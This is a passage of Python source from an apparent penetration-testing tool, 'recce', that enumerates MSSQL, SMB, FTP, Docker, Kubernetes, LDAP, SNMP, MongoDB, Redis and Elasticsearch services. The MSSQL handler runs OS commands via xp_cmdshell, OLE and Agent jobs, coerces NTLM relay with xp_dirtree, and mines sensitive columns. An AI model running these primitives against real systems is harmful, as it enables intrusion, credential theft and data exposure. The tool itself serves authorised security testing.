            print("      [i] netexec/nxc not installed - writing the commands to run "
                  "instead (see the MSSQL sheet).")
    elif creds:
        print("      [i] --no-run set - not executing nxc; commands are in the sheet.")

    # Deep enumeration via impacket-mssqlclient: run the queries, detect the actual
    # escalation chain per instance, and enrich the findings + runbook from live data.
    ran_impacket = False
    if creds and not args.no_run and mssql.mssqlclient_tool():
        for t in tgts:
            if t.get("access") is False:            # nxc already said the creds fail
                continue
            enum, err = mssql.run_mssqlclient(t["ip"], creds, port=t["port"],
                                              windows_auth=not args.local_auth)
            if enum is None:
                print(f"      [!] mssqlclient {t['ip']}: {err}")
                continue
            ran_impacket = True
            runner = mssql.link_runner(t["ip"], creds, port=t["port"],
                                       windows_auth=not args.local_auth)
            # Verify db_owner on the TRUSTWORTHY candidates so a chain is CONFIRMED.
            dbo_map = mssql.verify_dbowner(mssql.trustworthy_sysadmin_dbs(enum), runner)
            live_fs, live_chain, summary = mssql.chains_from_enum(t, enum, creds,
                                                                  dbo_map=dbo_map or None)
            analysis["findings"] = live_fs + analysis["findings"]
            for rb in analysis["runbooks"]:
                if rb["ip"] == t["ip"]:
                    rb["live"] = summary
                    if live_chain:
                        rb["chain"] = ["Live chain: " + " -> ".join(live_chain)] + rb["chain"]
            saf = " (sysadmin)" if summary["is_sysadmin"] else ""
            conf = summary.get("dbowner_confirmed") or []
            print(f"      [+] {t['ip']}:{t['port']}  enumerated as {summary['login']}{saf}"
                  f" - {len(summary['logins'])} login(s), {len(summary['links'])} "
                  f"linked server(s), {len(summary['trustworthy'])} TRUSTWORTHY db(s)"
                  + (f", db_owner on {', '.join(conf)}" if conf else ""))

            # Optionally trigger the SQL service account to auth to --lhost (relay).
            if args.relay and args.lhost:
                ok, rerr = mssql.run_xp_dirtree(t["ip"], creds, args.lhost, port=t["port"],
                                                windows_auth=not args.local_auth)
                if ok:
                    print(f"      [+] {t['ip']}: triggered xp_dirtree -> {args.lhost} "
                          "(ensure impacket-ntlmrelayx is listening)")
                else:
                    print(f"      [!] {t['ip']}: relay trigger failed: {rerr}")

            # Recursively walk the linked-server graph from this instance.
            if summary["links"] and not args.no_links:
                nodes = mssql.walk_links(summary["links"], runner,
                                         max_depth=args.link_depth)
                if nodes:
                    lf, lchain = mssql.link_findings(t, nodes, creds)
                    analysis["findings"] = lf + analysis["findings"]
                    for rb in analysis["runbooks"]:
                        if rb["ip"] == t["ip"]:
                            rb["linkgraph"] = nodes
                            if lchain:
                                rb["chain"] = ["Linked-server chain: " + "; ".join(lchain)] \
                                    + rb["chain"]
                    sa_n = sum(1 for n in nodes if n["sysadmin"])
                    print(f"      [+] {t['ip']}: linked-server walk reached {len(nodes)} "
                          f"instance(s), {sa_n} as sysadmin")

            # Mine the databases: tables + interesting columns across every database.
            if args.data:
                dbnames = [r[0] for r in enum.get("databases", [])]
                mined = mssql.run_datamine(dbnames, runner)
                if mined:
                    df = mssql.datamine_findings(t, mined, creds)
                    analysis["findings"] = df + analysis["findings"]
                    for rb in analysis["runbooks"]:
                        if rb["ip"] == t["ip"]:
                            rb["datamine"] = mined
                    sens = sum(1 for v in mined.values() if v["interesting"])
                    print(f"      [+] {t['ip']}: data-mined "
                          f"{sum(len(v['tables']) for v in mined.values())} table(s) "
                          f"across {len(mined)} db(s), {sens} with sensitive columns")
                    sensitive = "\n".join(f"{db}: {', '.join(v['interesting'][:8])}"
                                          for db, v in mined.items() if v["interesting"])
                    if sensitive:
                        _mssql_shot(
                            args, t["ip"], "datamine",
                            f"impacket-mssqlclient {creds['user']}@{t['ip']}",
                            "SELECT s.name+'.'+t.name+'.'+c.name FROM sys.columns c ... "
                            "-- sensitive columns across all databases",
                            sensitive)

            # Per-database object-permission mining (guest / public / object grants).
            if args.perms:
                dbnames = [r[0] for r in enum.get("databases", [])]
                perms = mssql.run_permmine(dbnames, runner)
                if perms:
                    pf = mssql.permmine_findings(t, perms, creds)
                    analysis["findings"] = pf + analysis["findings"]
                    for rb in analysis["runbooks"]:
                        if rb["ip"] == t["ip"]:
                            rb["permmine"] = perms
                    guest = [db for db, v in perms.items() if v["guest"]]
                    grants = sum(len(v["grants"]) for v in perms.values())
                    print(f"      [+] {t['ip']}: permission-mined - {len(guest)} db(s) "
                          f"with guest enabled, {grants} public/guest object grant(s)")

            # Prove write + permission-modify impact, reversibly.
            if args.prove_write:
                token = os.urandom(3).hex()
                ev, werr = mssql.prove_write(t["ip"], creds, token, port=t["port"],
                                             windows_auth=not args.local_auth)
                if ev:
                    analysis["findings"].insert(0, mssql.write_proof_finding(t, ev, creds))
                    extra = " + role membership" if ev.get("perm") == "1" else ""
                    print(f"      [+] {t['ip']}: PROVED write impact (field modify"
                          f"{extra}) - reverted")
                    proof_cmds = [
                        f"CREATE TABLE ##recce_{token} (id INT, note VARCHAR(64))",
                        f"INSERT INTO ##recce_{token} VALUES (1,'before')",
                        f"SELECT note FROM ##recce_{token}   -- before",
                        f"UPDATE ##recce_{token} SET note='{ev.get('update', '')}'",
                        f"SELECT note FROM ##recce_{token}   -- after (MODIFIED)",
                        f"DROP TABLE ##recce_{token}   -- reverted"]
                    proof_out = f"before\n{ev.get('update', '')}"
                    if ev.get("perm") == "1":
                        proof_cmds.append("ALTER SERVER ROLE dbcreator ADD MEMBER "
                                          f"recce_{token}; SELECT IS_SRVROLEMEMBER(...)")
                        proof_out += "\n1   -- role membership added (then reverted)"
                    _mssql_shot(args, t["ip"], "write_proof",
                                f"impacket-mssqlclient {creds['user']}@{t['ip']}",
                                proof_cmds, proof_out)
                else:
                    print(f"      [!] {t['ip']} write proof: {werr}")

            # Execute an OS command for effect (xp_cmdshell / OLE / Agent / CLR).
            if args.exec_cmd:
                out, eerr, ref = mssql.exec_command(
                    t["ip"], creds, args.exec_cmd, method=args.method,
                    port=t["port"], windows_auth=not args.local_auth)
                if ref:
                    print(f"      [i] {t['ip']} CLR is a tool hand-off: {ref}")
                elif eerr:
                    print(f"      [!] {t['ip']} exec ({args.method}): {eerr}")
                else:
                    snippet = " | ".join((out or "(no output)").splitlines()[:4])
                    print(f"      [+] {t['ip']} RCE via {args.method}: {snippet}")
                    rce_cmds = {
                        "xp": [f"EXEC xp_cmdshell '{args.exec_cmd}'"],
                        "ole": ["EXEC sp_OACreate 'WScript.Shell', @o OUT",
                                f"EXEC sp_OAMethod @o,'Run',NULL,'cmd /c {args.exec_cmd} ...'"],
                        "agent": ["EXEC msdb.dbo.sp_add_jobstep @subsystem='CmdExec', "
                                  f"@command='cmd /c {args.exec_cmd}'"],
                    }.get(args.method, [f"EXEC ... {args.exec_cmd}"])
                    _mssql_shot(args, t["ip"], f"rce_{args.method}",
                                f"impacket-mssqlclient {creds['user']}@{t['ip']}",
                                rce_cmds, out or "(no output)")
                    analysis["findings"].insert(0, mssql._finding(
                        "critical", f"Confirmed OS command execution via {args.method}",
                        f"{t['ip']}:{t['port']}",
                        f"Ran '{args.exec_cmd}' as the SQL service account. Output: "
                        + (out or "")[:400], "impacket-mssqlclient",
                        f"recce mssql -u <user> -p <pass> --exec '{args.exec_cmd}' "
                        f"--method {args.method}",
                        "Disable the primitive; run SQL under a low-privilege gMSA.",
                        ["CWE-250", "CWE-269"], kind="rce_confirmed"))

    # With any login we can coerce the service account's NetNTLM via UNC -> relay
    # it. Add the concrete relay finding (real targets) per endpoint.
    if creds:
        for t in tgts:
            rt = mssql.relay_targets(hosts, t["ip"])
            analysis["findings"].append(
                mssql.relay_finding(t, rt, args.lhost or "<LHOST>", creds))

    # De-duplicate findings (offline + nxc + live can overlap) by (title, target).
    seen: set = set()
    uniq = []
    for f in analysis["findings"]:
        k = (f["title"], f["target"])
        if k not in seen:
            seen.add(k)
            uniq.append(f)
    analysis["findings"] = uniq

    # A working SQL login is a foothold on that host -> record access so the Access
    # step auto-ticks. (nxc sets t["access"] above; mark it before the fold persists.)
    host_by_ip = {h.ip: h for h in hosts}
    for t in tgts:
        if t.get("access") and t["ip"] in host_by_ip:
            h = host_by_ip[t["ip"]]
            h.access_gained = True
            h.access_detail = h.access_detail or (
                "MSSQL sysadmin" if t.get("admin") else "MSSQL login")

    # Fold findings into the main severity totals + writeups (attach to each host).
    _fold_service_findings(store, hosts, analysis, "mssql",
                           mssql.findings_to_vulns, "MSSQL")
    # Running mssql assessed each SQL port (and is a DB deep-enum) -> auto-tick the
    # Checklist DB / Vuln-scan boxes for those hosts.
    if active or (creds and not args.no_run):
        _mark_capability_scanned(store, tgts, db=True)
    for t in tgts:
        for line in analysis["runbooks"][next(i for i, r in enumerate(analysis["runbooks"])
                                              if r["ip"] == t["ip"])]["chain"]:
            print(f"      {line}")
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    ran = [x for x, on in (("nxc", ran_nxc), ("impacket enum", ran_impacket)) if on]
    hint = " + ".join(ran) if ran else "commands-only"
    print(f"    -> MSSQL sheet written ({hint}); findings folded into the main totals.")
    return 0


def _smb_shot(args, ip, name, command, output):
    """Render a terminal-output proof screenshot of a live SMB action into
    engagement/screenshots/. Returns the saved path or None."""
    if not getattr(args, "screenshots", False):
        return None
    from . import smb, screenshot
    if not screenshot.available():
        return None
    png = screenshot.capture_html(smb.proof_html(command, output))
    if not png:
        return None
    shot_dir = os.path.join(args.output_dir, "screenshots")
    os.makedirs(shot_dir, exist_ok=True)
    path = os.path.join(shot_dir, f"smb_{ip.replace(':', '_')}_{name}.png")
    with open(path, "wb") as fh:
        fh.write(png)
    print(f"      [+] {ip}: proof screenshot -> {path}")
    return path


def cmd_smb(args: argparse.Namespace) -> int:
    """SMB offensive enumeration: credential-free stdlib negotiate probes (dialect /
    signing / SMBv1), then anonymous & credentialed share enumeration, a reversible
    writable-share proof, and the full runbook - folded into the main totals."""
    from . import smb
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first so recce "
              "knows which hosts run SMB.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)

    creds = None
    if args.username:
        user, domain = _split_userdomain(args.username, args.domain)
        creds = {"user": user, "secret": args.password or "", "domain": domain,
                 "dc_ip": args.dc_ip or ""}

    active = not args.no_probe
    analysis = smb.analyze(hosts, creds=creds, active=active, **_probe_kwargs(args, "smb"))
    tgts = analysis["targets"]
    if not tgts:
        print("[!] No SMB endpoints in the datastore (no port 445/139). Run `enum` "
              "against the SMB hosts first.")
        store.close()
        return 0
    print(f"[+] {len(tgts)} SMB endpoint(s):")
    for t in tgts:
        bits = [t.get("dialect") or ""]
        if t.get("signing_required") is False:
            bits.append("signing NOT REQUIRED")
        if t.get("smbv1"):
            bits.append("SMBv1 ENABLED")
        print(f"      {t['ip']}:{t['port']}  " + "  ".join(b for b in bits if b))

    # Record the directly-observed signing posture on each host so the prove engine
    # (_v_smb_signing) can adjudicate a relay finding as CONFIRMED, not a guess.
    host_by_ip = {h.ip: h for h in hosts}
    for t in tgts:
        req = t.get("signing_required")
        if req is None:
            continue
        host = host_by_ip.get(t["ip"])
        if host is not None:
            host.smb_signing = "required" if req else "not required"

    # Live layer: anonymous (null/guest) share enumeration + reversible write proof.
    rb_by_ip = {rb["ip"]: rb for rb in analysis["runbooks"]}
    ran_live = False
    if not args.no_run:
        for t in tgts:
            ip, port = t["ip"], t["port"]
            # Try a null session first, then guest.
            session = smb.enum_session(ip, "", "", port=port)
            if session.get("error") and "not installed" in (session["error"] or ""):
                print("      [i] nxc/netexec not installed - writing the commands to "
                      "run instead (see the SMB sheet).")
                break
            if not (session.get("shares") or session.get("users")):
                session = smb.enum_session(ip, "guest", "", port=port)
            ran_live = True
            shares = session.get("shares") or []
            live = {"shares": shares, "writable": [],
                    "session": (f"anonymous session: {len(shares)} share(s), "
                                f"{len(session.get('users') or [])} user(s)")}
            analysis["findings"].extend(smb.null_session_findings(ip, port, session))
            if session.get("output"):
                _smb_shot(args, ip, "enum",
                          f"nxc smb {ip} -u '' -p '' --shares --users --pass-pol",
                          session["output"])
            # Prove writable shares (reversible) when requested.
            if args.prove_write:
                for s in shares:
                    perms = (s.get("perms") or "").upper()
                    name = s.get("name", "")
                    if "WRITE" not in perms or name.upper() in ("IPC$", "PRINT$"):
                        continue
                    proof = smb.prove_writable(ip, name, creds, port=port)
                    if proof.get("writable"):
                        live["writable"].append({"share": name,
                                                 "evidence": proof.get("evidence", "")})
                        f = smb.write_proof_finding(ip, port, name, proof, creds)
                        if f:
                            analysis["findings"].insert(0, f)
                        _smb_shot(args, ip, f"write_{name}",
                                  proof.get("command", ""), proof.get("evidence", ""))
            rb_by_ip[ip]["live"] = live

    # De-duplicate (offline + live can overlap) by (title, target).
    seen: set = set()
    uniq = []
    for f in analysis["findings"]:
        k = (f["title"], f["target"])
        if k not in seen:
            seen.add(k)
            uniq.append(f)
    analysis["findings"] = uniq

    by_ip = _fold_service_findings(store, hosts, analysis, "smb",
                                   smb.findings_to_vulns, "SMB")
    # Persist the signing posture we observed (upsert any host we touched but that
    # produced no vulns, so host.smb_signing still lands).
    for t in tgts:
        if t["ip"] not in by_ip:
            host = host_by_ip.get(t["ip"])
            if host is not None and t.get("signing_required") is not None:
                store.upsert_host(host, merge=False)
    if active or ran_live:           # assessed the SMB port(s) -> auto-tick vuln-scan
        _mark_capability_scanned(store, tgts)
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    hint = "live enum" if ran_live else "commands-only"
    print(f"    -> SMB sheet written ({hint}); findings folded into the main totals.")
    return 0


def _ftp_shot(args, ip, name, command, output):
    if not getattr(args, "screenshots", False):
        return None
    from . import ftp, screenshot
    if not screenshot.available():
        return None
    png = screenshot.capture_html(ftp.proof_html(command, output))
    if not png:
        return None
    shot_dir = os.path.join(args.output_dir, "screenshots")
    os.makedirs(shot_dir, exist_ok=True)
    path = os.path.join(shot_dir, f"ftp_{ip.replace(':', '_')}_{name}.png")
    with open(path, "wb") as fh:
        fh.write(png)
    print(f"      [+] {ip}: proof screenshot -> {path}")
    return path


def cmd_ftp(args: argparse.Namespace) -> int:
    """FTP offensive enumeration: credential-free stdlib probe (banner / anonymous /
    AUTH-TLS + known-backdoor match), then a reversible writable-directory proof -
    folded into the main totals."""
    from . import ftp
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first so recce "
              "knows which hosts run FTP.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)

    creds = None
    if args.username:
        creds = {"user": args.username, "secret": args.password or ""}

    active = not args.no_probe
    analysis = ftp.analyze(hosts, creds=creds, active=active, **_probe_kwargs(args, "ftp"))
    tgts = analysis["targets"]
    if not tgts:
        print("[!] No FTP endpoints in the datastore (no port 21 / ftp service). Run "
              "`enum` against the FTP hosts first.")
        store.close()
        return 0
    print(f"[+] {len(tgts)} FTP endpoint(s):")
    for t in tgts:
        bits = [t.get("banner") or t.get("product") or ""]
        if t.get("anonymous"):
            bits.append("ANONYMOUS")
        if t.get("auth_tls") is False:
            bits.append("cleartext (no AUTH TLS)")
        print(f"      {t['ip']}:{t['port']}  " + "  ".join(b for b in bits if b))

    rb_by_ip = {rb["ip"]: rb for rb in analysis["runbooks"]}
    ran_live = False
    if not args.no_run and args.prove_write:
        for t in tgts:
            # Only attempt a write when a session is actually reachable (anonymous or
            # supplied creds), so we don't hammer a login we can't make.
            if not (t.get("anonymous") or creds):
                continue
            proof = ftp.prove_writable(t["ip"], t["port"], creds)
            ran_live = True
            if proof.get("writable"):
                rb_by_ip[t["ip"]]["live"] = {"writable": True,
                                             "evidence": proof.get("evidence", "")}
                f = ftp.write_proof_finding(t["ip"], t["port"], proof, creds)
                if f:
                    analysis["findings"].insert(0, f)
                _ftp_shot(args, t["ip"], "write",
                          f"ftp {t['ip']}  (STOR/DELE marker)", proof.get("evidence", ""))
            elif proof.get("error"):
                print(f"      [!] {t['ip']}: write proof - {proof['error']}")

    seen: set = set()
    uniq = []
    for f in analysis["findings"]:
        k = (f["title"], f["target"])
        if k not in seen:
            seen.add(k)
            uniq.append(f)
    analysis["findings"] = uniq

    _fold_service_findings(store, hosts, analysis, "ftp",
                           ftp.findings_to_vulns, "FTP")
    if active or ran_live:           # assessed the FTP port -> auto-tick vuln-scan
        _mark_capability_scanned(store, tgts)
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    hint = "write proof" if ran_live else "commands-only"
    print(f"    -> FTP sheet written ({hint}); findings folded into the main totals.")
    return 0


def cmd_docker(args: argparse.Namespace) -> int:
    """Docker Engine API enumeration: read the API unauthenticated (stdlib HTTP) and,
    if it answers, report the CONFIRMED critical exposure (remote root RCE on the
    host). recce reads the API to prove it - it never creates a container."""
    from . import docker
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first so recce "
              "knows which hosts expose the Docker API.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)

    active = not args.no_probe
    analysis = docker.analyze(hosts, active=active)
    tgts = analysis["targets"]
    if not tgts:
        print("[!] No Docker API endpoints in the datastore (no port 2375/2376). Run "
              "`enum` against the Docker hosts first.")
        store.close()
        return 0
    print(f"[+] {len(tgts)} Docker endpoint(s):")
    for t in tgts:
        if t.get("exposed"):
            state = "EXPOSED (unauth)"
        elif t.get("probed"):
            state = "locked (mutual-TLS / authenticated)"
        else:
            state = "not probed"
        extra = f"  {t.get('version', '')}" if t.get("version") else ""
        print(f"      {t['ip']}:{t['port']}  {state}{extra}")

    # Optional proof screenshot of the (synthesised) `docker info` for exposed hosts.
    if getattr(args, "screenshots", False):
        for t in tgts:
            pr = analysis["probes"].get(f"{t['ip']}:{t['port']}")
            if pr and pr.get("exposed"):
                out = (f"Server Version: {pr.get('server_version', '')}\n"
                       f"Name: {pr.get('name', '')}\n"
                       f"Containers: {pr.get('containers', '?')}  "
                       f"Images: {pr.get('images', '?')}\n"
                       f"Kernel Version: {pr.get('kernel', '')}")
                _docker_shot(args, t["ip"],
                             f"docker -H {docker._scheme(t['port'])}://{t['ip']}:"
                             f"{t['port']} info", out)

    _fold_service_findings(store, hosts, analysis, "docker",
                           docker.findings_to_vulns, "Docker")
    if active:                       # read the Docker API port -> auto-tick vuln-scan
        _mark_capability_scanned(store, tgts)
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    print("    -> Docker sheet written; findings folded into the main totals.")
    return 0


def _docker_shot(args, ip, command, output):
    from . import docker, screenshot
    if not screenshot.available():
        return None
    png = screenshot.capture_html(docker.proof_html(command, output))
    if not png:
        return None
    shot_dir = os.path.join(args.output_dir, "screenshots")
    os.makedirs(shot_dir, exist_ok=True)
    path = os.path.join(shot_dir, f"docker_{ip.replace(':', '_')}.png")
    with open(path, "wb") as fh:
        fh.write(png)
    print(f"      [+] {ip}: proof screenshot -> {path}")
    return path


def cmd_kubernetes(args: argparse.Namespace) -> int:
    """Kubernetes attack-surface enumeration: unauthenticated reads of the kubelet
    (10250/10255), kube-apiserver (6443/8443) and etcd (2379). recce only READS to
    prove exposure - it never execs into a pod or writes to etcd."""
    from . import kubernetes as k8s
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first so recce "
              "knows which hosts run Kubernetes.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)

    active = not args.no_probe
    analysis = k8s.analyze(hosts, active=active)
    tgts = analysis["targets"]
    if not tgts:
        print("[!] No Kubernetes endpoints in the datastore (no kubelet/apiserver/etcd "
              "port). Run `enum` against the cluster hosts first.")
        store.close()
        return 0
    print(f"[+] {len(tgts)} Kubernetes surface(s):")
    for t in tgts:
        exposed = (t.get("anon_pods") or t.get("anon_list")
                   or t.get("v2_readable") or t.get("v3_readable"))
        state = "EXPOSED (unauth)" if exposed else \
            ("reachable" if t.get("reachable") else "not probed")
        print(f"      {t['ip']}:{t['port']}  {t.get('role', '')}  {state}")

    _fold_service_findings(store, hosts, analysis, "kubernetes",
                           k8s.findings_to_vulns, "Kubernetes")
    if active:                       # probed the kubelet/API/etcd ports -> vuln-scan
        _mark_capability_scanned(store, tgts)
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    print("    -> Kubernetes sheet written; findings folded into the main totals.")
    return 0


def cmd_ldap(args: argparse.Namespace) -> int:
    """Deep LDAP / AD directory enumeration: a stdlib BER/ASN.1 client anonymously
    binds, reads the RootDSE (domain/forest/DC/functional level), and tests whether
    the directory is anonymously readable. Read-only - it never writes to the
    directory. Credentialed follow-on commands are staged, not run."""
    from . import ldap as _ldap
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first so recce "
              "knows which hosts expose LDAP.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)
    creds = None
    if args.username:
        user, domain = _split_userdomain(args.username, args.domain)
        creds = {"user": user, "secret": args.password or "", "domain": domain,
                 "hash": getattr(args, "hash", None) or ""}   # --hash -> NTLM pass-the-hash

    active = not args.no_probe
    analysis = _ldap.analyze(hosts, creds=creds, active=active, **_probe_kwargs(args, "ldap"))
    tgts = analysis["targets"]
    if not tgts:
        print("[!] No LDAP endpoints in the datastore (no port 389/636/3268/3269). "
              "Run `enum` against the domain controllers first.")
        store.close()
        return 0
    print(f"[+] {len(tgts)} LDAP endpoint(s):")
    for t in tgts:
        flags = []
        if t.get("anon_read"):
            flags.append("ANON-READ")
        elif t.get("anon_bind"):
            flags.append("anon-bind")
        if t.get("auth_ok"):
            flags.append(f"AUTH: {t.get('auth_users', 0)} users / "
                         f"{t.get('kerberoastable', 0)} kerb / {t.get('asrep', 0)} asrep")
        elif t.get("auth_error"):
            flags.append(f"auth failed ({t['auth_error']})")
        dom = f"  {t.get('domain', '')}" if t.get("domain") else ""
        dc = f" ({t.get('dc_dns')})" if t.get("dc_dns") else ""
        state = "  ".join(flags) or "probed"
        print(f"      {t['ip']}:{t['port']}  {state}{dom}{dc}")

    if getattr(args, "screenshots", False):
        for t in tgts:
            pr = analysis["probes"].get(f"{t['ip']}:{t['port']}")
            if pr and pr.get("rootdse_ok"):
                out = "\n".join(filter(None, [
                    f"domain: {pr.get('domain', '')}",
                    f"forest: {pr.get('forest', '')}",
                    f"dnsHostName: {pr.get('dc_dns', '')}",
                    f"functional level: Server {pr.get('dc_level', '')}",
                    f"anonymous read: {'YES' if pr.get('anon_read') else 'no'}"]))
                _ldap_shot(args, t["ip"], f"ldapsearch -x -H ldap://{t['ip']}:{t['port']} "
                           "-s base -b '' '(objectClass=*)'", out)

    # analyze() attached authenticated-enum Account objects onto the DC hosts in place.
    by_ip = _fold_service_findings(store, hosts, analysis, "ldap",
                                   _ldap.findings_to_vulns, "LDAP")
    # Persist any DC that gained LDAP accounts but produced no LDAP vuln row (e.g. an
    # LDAPS host with authenticated enum but no anonymous/cleartext finding).
    host_by_ip = {h.ip: h for h in hosts}
    for t in tgts:
        if t.get("auth_ok") and t["ip"] not in by_ip and t["ip"] in host_by_ip:
            store.upsert_host(host_by_ip[t["ip"]], merge=False)
    if active:                       # bound/read the LDAP port -> auto-tick vuln-scan
        _mark_capability_scanned(store, tgts)
    total_accts = sum(t.get("auth_users", 0) for t in tgts)
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    extra = (f" ({total_accts} account(s) enumerated -> Users & Accounts / AD Quick Wins)"
             if total_accts else "")
    print(f"    -> LDAP sheet written{extra}; findings folded into the main totals.")
    return 0


def _ldap_shot(args, ip, command, output):
    from . import ldap as _ldap, screenshot
    if not screenshot.available():
        return None
    png = screenshot.capture_html(_ldap.proof_html(command, output))
    if not png:
        return None
    shot_dir = os.path.join(args.output_dir, "screenshots")
    os.makedirs(shot_dir, exist_ok=True)
    path = os.path.join(shot_dir, f"ldap_{ip.replace(':', '_')}.png")
    with open(path, "wb") as fh:
        fh.write(png)
    print(f"      [+] {ip}: proof screenshot -> {path}")
    return path


def cmd_snmp(args: argparse.Namespace) -> int:
    """Deep SNMP enumeration: brute common community strings over UDP 161, then read
    the system group + walk Windows users / processes / software. Read-only - recce
    never sends a SET (a read-write community is flagged by name, not exercised)."""
    from . import snmp
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)

    active = not args.no_probe
    analysis = snmp.analyze(hosts, active=active, **_probe_kwargs(args, "snmp"))
    tgts = analysis["targets"]
    if not tgts:
        print("[!] No SNMP-responsive hosts. (SNMP is UDP 161; recce probes it directly, "
              "so target the hosts you expect to run it.)")
        store.close()
        return 0
    print(f"[+] {len(tgts)} SNMP endpoint(s):")
    for t in tgts:
        c = t.get("community")
        state = (f"community '{c}'" + ("  [RW-likely]" if t.get("rw_likely") else "")
                 if c else "no readable community")
        name = f"  {t.get('sys_name')}" if t.get("sys_name") else ""
        users = f"  {t.get('users')} users" if t.get("users") else ""
        print(f"      {t['ip']}:{t['port']}  {state}{name}{users}")

    by_ip = _fold_service_findings(store, hosts, analysis, "snmp",
                                   snmp.findings_to_vulns, "SNMP")
    # analyze() attached SNMP Account rows in place; persist hosts that gained them
    # but produced no SNMP vuln (rare) so the accounts still land.
    host_by_ip = {h.ip: h for h in hosts}
    for t in tgts:
        if t.get("users") and t["ip"] not in by_ip and t["ip"] in host_by_ip:
            store.upsert_host(host_by_ip[t["ip"]], merge=False)
    if active:
        _mark_capability_scanned(store, tgts)
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    print("    -> SNMP sheet written; findings folded into the main totals.")
    return 0


def cmd_mongodb(args: argparse.Namespace) -> int:
    """Deep MongoDB enumeration: speak the wire protocol (stdlib OP_MSG/BSON), read the
    version, and test whether listDatabases works WITHOUT authentication - an exposed
    instance is a CONFIRMED critical data exposure. Read-only."""
    from . import mongodb
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first so recce "
              "knows which hosts expose MongoDB.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)

    active = not args.no_probe
    analysis = mongodb.analyze(hosts, active=active, **_probe_kwargs(args, "mongodb"))
    tgts = analysis["targets"]
    if not tgts:
        print("[!] No MongoDB endpoints in the datastore (no port 27017-27019). Run "
              "`enum` against the database hosts first.")
        store.close()
        return 0
    print(f"[+] {len(tgts)} MongoDB endpoint(s):")
    for t in tgts:
        if t.get("unauth"):
            state = f"EXPOSED (unauth, {t.get('databases', 0)} db)"
        else:
            state = "auth required" if t.get("version") else "probed"
        ver = f"  {t.get('version', '')}" if t.get("version") else ""
        print(f"      {t['ip']}:{t['port']}  {state}{ver}")

    _fold_service_findings(store, hosts, analysis, "mongodb",
                           mongodb.findings_to_vulns, "MongoDB")
    if active:
        _mark_capability_scanned(store, tgts)
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    print("    -> MongoDB sheet written; findings folded into the main totals.")
    return 0


def cmd_redis(args: argparse.Namespace) -> int:
    """Deep Redis enumeration: speak RESP (stdlib), read the version, and test whether
    INFO works WITHOUT authentication - an exposed instance is a CONFIRMED critical
    exposure (full read/write + a file-write -> RCE primitive). Read-only."""
    from . import redis as _redis
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first so recce "
              "knows which hosts expose Redis.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)

    active = not args.no_probe
    analysis = _redis.analyze(hosts, active=active, **_probe_kwargs(args, "redis"))
    tgts = analysis["targets"]
    if not tgts:
        print("[!] No Redis endpoints in the datastore (no port 6379/6380). Run `enum` "
              "against the cache/database hosts first.")
        store.close()
        return 0
    print(f"[+] {len(tgts)} Redis endpoint(s):")
    for t in tgts:
        if t.get("unauth"):
            state = f"EXPOSED (unauth, {t.get('keys', 0)} keys)"
        elif t.get("auth_required"):
            state = "auth required"
        else:
            state = "probed" if t.get("version") else "reachable"
        ver = f"  {t.get('version', '')}" if t.get("version") else ""
        print(f"      {t['ip']}:{t['port']}  {state}{ver}")

    _fold_service_findings(store, hosts, analysis, "redis",
                           _redis.findings_to_vulns, "Redis")
    if active:
        _mark_capability_scanned(store, tgts)
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    print("    -> Redis sheet written; findings folded into the main totals.")
    return 0


def cmd_elasticsearch(args: argparse.Namespace) -> int:
    """Deep Elasticsearch enumeration: GET the HTTP API (stdlib), read the version, and
    test whether /_cat/indices works WITHOUT authentication - an exposed cluster is a
    CONFIRMED critical data exposure. Read-only (GETs only)."""
    from . import elasticsearch as _es
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first so recce "
              "knows which hosts expose Elasticsearch.")
        return 1
    store = _open_store(paths["db"])
